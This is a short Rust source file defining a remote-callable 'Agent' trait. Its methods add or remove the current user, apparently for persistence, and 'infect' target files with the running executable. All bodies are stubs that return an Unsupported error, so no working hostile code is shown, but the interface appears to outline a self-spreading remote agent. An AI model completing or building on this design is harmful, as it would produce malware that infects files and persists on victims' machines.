use crate::{Error, Result as AppResult};
use remoc::rtc;
use std::{env, path::PathBuf};

/// Auto select shell in unix-like os
///
/// powershell in windows
#[rtc::remote]
pub trait Agent: Sync {
    async fn exist_current_user(&self) -> AppResult<bool> {
        Err(Error::Unsupported)
    }

    async fn remove_current_user(&self) -> AppResult<()> {
        Err(Error::Unsupported)
    }

    async fn add_current_user_at(&self, _exe: PathBuf) -> AppResult<()> {
        Err(Error::Unsupported)
    }

    async fn add_current_user(&self) -> AppResult<()> {
        self.add_current_user_at(env::current_exe()?.to_path_buf())
            .await
    }

    async fn infect(&self, target: PathBuf) -> AppResult<bool> {
        self.infect_at(target, env::current_exe()?.to_path_buf())
            .await
    }

    async fn infect_at(&self, _target: PathBuf, _exe: PathBuf) -> AppResult<bool> {
        Err(Error::Unsupported)
    }

    async fn infectious(&self, target: PathBuf) -> AppResult<bool> {
        self.infectious_at(target, env::current_exe()?.to_path_buf())
            .await
    }

    async fn infectious_at(&self, _target: PathBuf, _exe: PathBuf) -> AppResult<bool> {
        Err(Error::Unsupported)
    }
}
